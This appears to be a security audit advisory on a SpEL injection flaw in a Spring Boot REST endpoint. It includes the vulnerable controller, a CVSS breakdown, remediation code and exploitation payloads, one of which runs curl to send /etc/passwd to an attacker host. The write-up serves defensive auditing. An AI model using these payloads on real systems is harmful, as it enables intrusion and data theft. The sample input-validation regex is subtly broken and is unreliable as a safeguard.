# Spring Expression Language (SpEL) Injection Vulnerability

# Vulnerability Case
During our security audit of Acme Corp’s Spring Boot application, we identified a potential SpEL (Spring Expression Language) injection vulnerability in an endpoint that dynamically evaluates expressions constructed from user-supplied input. The vulnerability was discovered by reviewing the application’s source code, where a REST controller method directly parsed HTTP request parameters as SpEL expressions without proper sanitization or validation. This insecure coding pattern can allow an attacker to inject malicious payloads, potentially leading to unauthorized data access or manipulation of application behavior. The impacted technology stack includes Java with Spring Boot and Spring Security, which is widely used in enterprise environments. The discovery highlights significant business risks such as escalated privileges, data leakage, and potential compromise of backend systems.

```java
import org.springframework.expression.Expression;
import org.springframework.expression.ExpressionParser;
import org.springframework.expression.spel.standard.SpelExpressionParser;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;

@RestController
public class SpelInjectionController {

  @GetMapping("/spel")
  public String evaluateSpel(@RequestParam String expr) {
    ExpressionParser parser = new SpelExpressionParser();
    // Vulnerable pattern: Directly evaluating unfiltered user input as a SpEL expression
    Expression expression = parser.parseExpression(expr);
    return expression.getValue(String.class);
  }
}
```

An attacker can exploit this vulnerability by submitting a maliciously crafted SpEL payload via the HTTP request parameter `expr`. Once evaluated, the payload could invoke prohibited methods or access sensitive internal state due to the lack of input validation, leading to potential unauthorized code execution. Exploiting this flaw might result in an attacker bypassing authentication or authorization controls, thereby impacting the confidentiality, integrity, and availability of the business-critical application. Such a compromise could also expose sensitive operational data and facilitate further lateral movement within the corporate network.


context: java.spring.security.audit.spel-injection.spel-injection A Spring expression is built with a dynamic value. The source of the value(s) should be verified to avoid that unfiltered values fall into this risky code evaluation.

# Vulnerability Breakdown
This vulnerability analysis examines a critical SpEL injection vulnerability in Acme Corp's Spring Boot application where user input is directly evaluated as Spring Expression Language without sanitization.

1. **Key vulnerability elements**:
   - Direct parsing of user input via `parseExpression()` without validation
   - Exposed via public REST endpoint requiring no authentication
   - Spring's powerful expression language allows extensive system access
   - Potentially grants attackers access to Java runtime environment
   - No restrictions on SpEL evaluation context

2. **Potential attack vectors**:
   - Remote arbitrary code execution via Java reflection
   - Access to sensitive system properties and environment variables
   - Extraction of application context beans and sensitive configurations
   - Manipulation of application behavior through context modification
   - Bypassing authentication mechanisms via context access

3. **Severity assessment**:
   - Remote exploitation via network requests to the API endpoint
   - Requires sophisticated knowledge of SpEL syntax and Spring internals
   - No authentication needed to access the vulnerable endpoint
   - High impact on confidentiality, integrity, and availability
   - Arbitrary code execution capabilities

4. **CVSS v3.1 calculation**:
   - Attack Vector (AV): Network (N) 
   - Attack Complexity (AC): High (H) 
   - Privileges Required (PR): None (N) 
   - User Interaction (UI): None (N) 
   - Scope (S): Unchanged (U)
   - Confidentiality (C): High (H) 
   - Integrity (I): High (H) 
   - Availability (A): High (H) 

# Description
A critical SpEL (Spring Expression Language) injection vulnerability has been identified in Acme Corp's Spring Boot application. The vulnerability exists in a REST controller endpoint that directly evaluates user-supplied input as SpEL expressions without any validation or sanitization.

```java
@GetMapping("/spel")
public String evaluateSpel(@RequestParam String expr) {
  ExpressionParser parser = new SpelExpressionParser();
  // Vulnerable pattern: Directly evaluating unfiltered user input as a SpEL expression
  Expression expression = parser.parseExpression(expr);
  return expression.getValue(String.class);
}

```

This implementation allows attackers to submit malicious SpEL expressions through the `expr` parameter that can access internal application components, execute arbitrary Java code, read sensitive system properties, and potentially compromise the entire application. The vulnerability stems from treating untrusted user input as trusted code that gets evaluated within the application's security context.

# CVSS
**Score**: 8.1 \
**Vector**: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H \
**Severity**: High

The High severity rating (8.1) is justified by several factors:

- **Network Attack Vector (AV:N)**: The vulnerability is exploitable remotely by anyone who can send HTTP requests to the affected endpoint, making it broadly accessible to potential attackers.

- **High Attack Complexity (AC:H)**: Exploitation requires specialized knowledge of Spring Expression Language syntax, Spring framework internals, and Java reflection techniques. Crafting effective payloads demands understanding of the target application's structure and class hierarchy. The attacker must often employ trial and error to determine which classes are available in the classpath and how to reference them properly. Additionally, security protections like class loading restrictions and security managers may need to be bypassed, further increasing complexity.

- **No Privileges Required (PR:N)**: The vulnerable endpoint does not require authentication, allowing unauthenticated attackers to exploit it.

- **No User Interaction (UI:N)**: The vulnerability can be exploited without any actions from legitimate users.

- **Unchanged Scope (S:U)**: While the impact is severe, the vulnerability affects only the vulnerable component itself.

- **High Confidentiality Impact (C:H)**: Attackers can access sensitive information from the application, system properties, environment variables, and configuration data.

- **High Integrity Impact (I:H)**: Attackers can modify data within the application by manipulating the application context or executing code that changes application state.

- **High Availability Impact (A:H)**: Attackers can impact service availability by causing exceptions, consuming resources, or directly manipulating application components that affect stability.

The combination of remote exploitation with no authentication requirements and the potential for complete system compromise results in a high severity rating, mitigated only by the specialized knowledge required to craft effective exploitation payloads.

# Exploitation Scenarios
**Scenario 1: Arbitrary Code Execution**
An attacker discovers the vulnerable `/spel` endpoint through routine scanning. They craft a malicious payload using Java reflection capabilities: `T(java.lang.Runtime).getRuntime().exec('curl -d "$(cat /etc/passwd)" https://attacker.com/exfil')`. When submitted as the `expr` parameter, this payload executes a shell command that exfiltrates the system's password file to the attacker's server.

**Scenario 2: Data Exfiltration**
An attacker submits a series of exploratory SpEL expressions to map the application context. Starting with `@applicationContext.getBeanDefinitionNames()` to enumerate available beans, they discover a `dataSource` bean. They then craft expressions like `@dataSource.getConnection().getMetaData().getTables(null, null, "%", null).toString()` to extract database schema information, followed by targeted data extraction using custom SQL queries through the connection.

**Scenario 3: Authentication Bypass**
The attacker uses SpEL to locate authentication components with `@applicationContext.getBeansOfType(T(org.springframework.security.authentication.AuthenticationManager).class)`. After identifying authentication managers and related beans, they craft expressions to manipulate authentication state or extract credential-checking logic, ultimately bypassing authentication mechanisms entirely.

**Scenario 4: Persistent Backdoor Installation**
The attacker leverages the vulnerability to execute code that modifies application configuration at runtime or injects malicious components into the application context. They could submit an expression that registers a new bean implementing a backdoor, such as a hidden controller that gives them persistent access even if the original vulnerability is patched.

# Impact Analysis
**Business Impact:**
- Unauthorized access to sensitive customer data potentially triggering regulatory violations (GDPR, CCPA, HIPAA)
- Intellectual property theft if proprietary algorithms or business logic can be extracted
- Financial losses from service disruption, remediation costs, and potential ransom demands
- Reputation damage from public disclosure of a security breach
- Loss of customer trust and business relationships
- Legal liabilities from compromised customer data or service agreements
- Operational disruptions affecting business continuity

**Technical Impact:**
- Complete application compromise through arbitrary code execution
- Unauthorized access to sensitive configuration data including database credentials, API keys, and encryption keys
- Database compromise through access to database connections and query execution
- System-level compromise through Java Runtime execution capabilities
- Authentication and authorization bypass leading to unauthorized access
- Session hijacking and impersonation of legitimate users
- Data integrity violations through unauthorized modifications
- Potential lateral movement to other internal systems
- Persistent backdoor installation allowing continued access
- Application instability or denial of service through resource exhaustion or exception triggering

# Technical Details
The vulnerability is a classic case of injection resulting from direct evaluation of untrusted input. In this case, Spring Expression Language (SpEL) is particularly dangerous as it provides powerful capabilities including:

1. **Java Reflection Access**: SpEL can reference and invoke any Java class accessible in the classpath using the `T()` operator
2. **Application Context Access**: When evaluated within Spring, expressions can access the entire application context with `@applicationContext`
3. **Method Invocation**: Arbitrary method calls on exposed objects
4. **Property Access**: Reading and potentially writing properties of objects

The vulnerable code pattern is:

```java
@GetMapping("/spel")
public String evaluateSpel(@RequestParam String expr) {
  ExpressionParser parser = new SpelExpressionParser();
  Expression expression = parser.parseExpression(expr);
  return expression.getValue(String.class);
}

```

This code has several critical security issues:

1. **No Input Validation**: The user-supplied `expr` parameter is passed directly to `parseExpression()` without any validation or sanitization.

2. **No Execution Context Restriction**: No attempt to restrict what the SpEL expression can access. By default, SpEL expressions have access to a wide range of capabilities.

3. **No Error Handling**: Exceptions might reveal sensitive information about the application structure.

4. **Direct String Return**: The result of the expression evaluation is directly returned to the user, facilitating data exfiltration.

**Exploitation Mechanics:**

Attackers can exploit this vulnerability using various SpEL expressions:

1. **Accessing System Properties**:
   ```
   T(java.lang.System).getProperty('java.class.path')
   
   ```

2. **Executing System Commands**:
   ```
   T(java.lang.Runtime).getRuntime().exec('cmd /c dir')
   
   ```

3. **Accessing Application Context**:
   ```
   @applicationContext.getBeanDefinitionNames()
   
   ```

4. **Reading Application Configuration**:
   ```
   @environment.getProperty('spring.datasource.password')
   
   ```

5. **Accessing File System**:
   ```
   new java.io.File('/etc/passwd').exists()
   
   ```

These capabilities effectively give attackers a shell-like interface to the application's internals and the underlying system, representing one of the most severe types of vulnerabilities possible in a Spring application.

# Remediation Steps
## Remove Direct User Input Evaluation

**Priority**: P0

The most effective remediation is to completely remove dynamic evaluation of user input as SpEL expressions. Replace with predefined operation patterns:

```java
@GetMapping("/data")
public String getData(@RequestParam String operation, @RequestParam String field) {
  // Use a switch statement or map to handle specific operations
  if (!ALLOWED_FIELDS.contains(field)) {
    throw new IllegalArgumentException("Invalid field name");
  }
  
  switch (operation) {
    case "uppercase":
      return getFieldValue(field).toUpperCase();
    case "lowercase":
      return getFieldValue(field).toLowerCase();
    case "length":
      return String.valueOf(getFieldValue(field).length());
    default:
      throw new IllegalArgumentException("Unsupported operation");
  }
}

private String getFieldValue(String fieldName) {
  // Safe method to retrieve field values
  // Implement field access logic here
}

```

This approach:
1. Completely eliminates SpEL evaluation of user input
2. Restricts operations to a predefined set of safe functions
3. Validates field names against an allowlist
4. Provides explicit control over what data can be accessed and how
## Implement SpEL Sandboxing with Strict Evaluation Context

**Priority**: P1

If dynamic SpEL evaluation is absolutely necessary, implement a strict sandbox:

```java
import org.springframework.expression.spel.support.SimpleEvaluationContext;
import org.springframework.expression.spel.support.StandardEvaluationContext;

@GetMapping("/spel")
public String evaluateSpel(@RequestParam String expr) {
  // Validate input pattern first
  if (!isValidExpression(expr)) {
    throw new IllegalArgumentException("Invalid expression format");
  }
  
  // Create a safe data model with only the data you want to expose
  Map<String, Object> safeData = new HashMap<>();
  safeData.put("product", getCurrentProduct());
  safeData.put("category", getCurrentCategory());
  
  // Create restricted evaluation context
  SimpleEvaluationContext context = SimpleEvaluationContext.forReadOnlyDataBinding()
    .withRootObject(safeData)
    .build();
  
  ExpressionParser parser = new SpelExpressionParser();
  try {
    // Parse with restricted context
    Expression expression = parser.parseExpression(expr);
    return expression.getValue(context, String.class);
  } catch (Exception e) {
    logger.warn("SpEL evaluation error: {}" + expr, e.getMessage());
    return "Expression evaluation error";
  }
}

private boolean isValidExpression(String expr) {
  // Implement strict validation pattern
  // Only allow simple property access and basic operations
  // Reject anything with T(), new, @, #, etc.
  return expr.matches("^[a-zA-Z0-9_.()\s\+\-\*\/\?:']+$") && 
         !expr.matches(".*\\b(T|new|@|#)\\b.*");
}

```

This implementation:
1. Validates input against a strict pattern before processing
2. Uses `SimpleEvaluationContext` instead of `StandardEvaluationContext` to restrict available features
3. Provides only specific data objects to the evaluation context
4. Implements exception handling to prevent information leakage
5. Restricts property access to read-only


# References
* CWE-94 | [Improper Control of Generation of Code ('Code Injection')](https://cwe.mitre.org/data/definitions/94.html)
* CWE-77 | [Improper Neutralization of Special Elements used in a Command ('Command Injection')](https://cwe.mitre.org/data/definitions/77.html)
